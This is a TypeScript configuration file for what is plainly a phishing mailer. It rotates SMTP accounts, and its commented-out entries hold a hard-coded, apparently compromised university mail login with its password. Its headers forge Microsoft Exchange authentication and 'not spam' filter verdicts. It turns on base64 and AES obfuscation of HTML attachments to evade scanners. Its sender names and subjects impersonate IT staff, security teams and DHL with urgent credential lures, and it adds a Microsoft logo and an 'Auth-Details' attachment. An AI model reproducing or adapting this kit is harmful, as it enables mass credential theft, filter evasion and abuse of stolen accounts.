import dotenv from 'dotenv';
dotenv.config();

export interface SMTPAccount {
    host: string;
    port: string;
    auth: boolean;
    username: string;
    password: string;
    fromEmail: string[];
}

export interface CustomHeaders {
    [key: string]: string;
}

export interface EncryptionConfig {
    letter: {
        zeroFont_letter: boolean;
        base64_html_letter: boolean;
        base64_letter: boolean;
    };
    attachment: {
        obsfucate_html_attachment: boolean;
        zeroFont_html_attachment: boolean;
        base64_html_attachment: boolean;
        aes_html_attachment: boolean;
    };
}

export interface MessageConfig {
    fromName: string[];
    replyTo: string[];
    subject: string[];
}

export interface AppConfig {
    License: string;
    pauseAfter: number;
    pauseFor: number;
    fileName: string;
    textLetter: boolean;
    useHeader: boolean;
    useAttach: boolean;
    attachFilename: string[];
    links: string[];
    sleep: number;
    threads: number;
    date_format: number;
    time_format: number;
    multiple_proxy: string[];
    htmlAttach_to_pdf: boolean;
    html_to_image: boolean;
    bg_logo: string;
}

export interface Config {
    smtp: SMTPAccount[];
    custom_headers: CustomHeaders;
    encryption: EncryptionConfig;
    message: MessageConfig;
    config: AppConfig;
}

export const smtp: SMTPAccount[] = [
    {
        host: process.env.SMTP_HOST_1!,
        port: process.env.SMTP_PORT_1!,
        auth: true,
        username: process.env.SMTP_USER_1!,
        password: process.env.SMTP_PASS_1!,
        fromEmail: [process.env.SMTP_FROM_1!],
    },
    // {
    //     host: process.env.SMTP_HOST_2 || "mail.nevsehir.edu.tr",
    //     port: process.env.SMTP_PORT_2 || "587",
    //     auth: true,
    //     username: process.env.SMTP_USER_2 || "finetech@nevsehir.edu.tr",
    //     password: process.env.SMTP_PASS_2 || "lari888",
    //     fromEmail: [process.env.SMTP_FROM_2 || "finetech@nevsehir.edu.tr"],
    // },
    // {
    //     host: process.env.SMTP_HOST_3 || "mail.nevsehir.edu.tr",
    //     port: process.env.SMTP_PORT_3 || "587",
    //     auth: true,
    //     username: process.env.SMTP_USER_3 || "finetech@nevsehir.edu.tr",
    //     password: process.env.SMTP_PASS_3 || "lari888",
    //     fromEmail: [process.env.SMTP_FROM_3 || "finetech@nevsehir.edu.tr"],
    // },
    // {
    //     host: process.env.SMTP_HOST_4 || "mail.nevsehir.edu.tr",
    //     port: process.env.SMTP_PORT_4 || "587",
    //     auth: true,
    //     username: process.env.SMTP_USER_4 || "finetech@nevsehir.edu.tr",
    //     password: process.env.SMTP_PASS_4 || "lari888",
    //     fromEmail: [process.env.SMTP_FROM_4 || "finetech@nevsehir.edu.tr"],
    // }
];

export const custom_headers: CustomHeaders = {
    'X-Priority': '2',
    'X-MSMail-Priority': 'Normal',
    'importance': "Normal",
    'X-MS-Exchange-Organization-AuthAs': 'Internal',
    'X-MS-Exchange-Organization-AuthMechanism': '04',
    'X-MS-Exchange-Organization-AuthSource': 'AM6PR05MB6112.eurprd02.prod.outlook.com',
    'X-Mailer': 'Microsoft Office Outlook, Build 11.0.5510',
    'X-MimeOLE': 'Produced By Microsoft MimeOLE V6.00.2800.1441',
    'X-Peer': '127.0.0.1',
    'X-Recommended-Action': 'accept',
    'X-Spam-Category': 'LEGIT',
    'X-SpamCatcher-Score': '0',
    'X-Virus-Scanned': 'OK',
    'X-Attach-Flag': 'N',
    'x-live-global-disposition': 'G',
    'X-Suspicious-Flag': 'NO',
    'X-SpamFilter-By': 'BOX Solutions SpamTrap 3.5 with qID r0HNXZSI028539, This message is passed by code: ctdos35128',
    'X-Spam-Flag': 'NO',
    'X-SpamInfo': 'spam not detected',
};

export const encryption: EncryptionConfig = {
    letter: {
        zeroFont_letter: false,
        base64_html_letter: false,
        base64_letter: false,
    },
    attachment: {
        obsfucate_html_attachment: false,
        zeroFont_html_attachment: false,
        base64_html_attachment: true,
        aes_html_attachment: true
    }
};

// Helper to handle comma-separated env values
const envArray = (key: string, defaultValue?: string[]): string[] => {
    const val = process.env[key];
    if (!val) return defaultValue || [];
    return val.split(',').map(s => s.trim().replace(/^"|"$/g, ''));
};

export const message: MessageConfig = {
    fromName: envArray('EMAIL_FROM_NAMES', ['Security Department on Behalf of {{company}}', 'IT Administration at {{SchoolName}}', 'Accounts Payable - {{company}}', 'System Administrator <noreply@{{SchoolName}}>']),
    replyTo: envArray('EMAIL_REPLY_TO', ['']),
    subject: envArray('EMAIL_SUBJECTS', ['Security Notification: Credential Handshake Failure Detected - {{rnum}}', 'DHL Express: Final Delivery Notice for Shipment #{{TargetID}}', 'Action Required: Mandatory Identity Re-synchronization - {{date}}', 'Urgent: Security Synchronization Required for {{email}}']),
};

export const config: AppConfig = {
    License: "owner:769547FF-876C-11E4-8486-44510D17F8FF",
    pauseAfter: 2000,
    pauseFor: 10,
    fileName: process.env.LEADS_FILE || "mail.txt",
    textLetter: false,
    useHeader: true,
    useAttach: false,
    attachFilename: ["Auth-Details.HTML-~"],
    links: [""],
    sleep: 2,
    threads: 5,
    date_format: 1,
    time_format: 2,
    multiple_proxy: [""],
    htmlAttach_to_pdf: false,
    html_to_image: false,
    bg_logo: "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg",
};
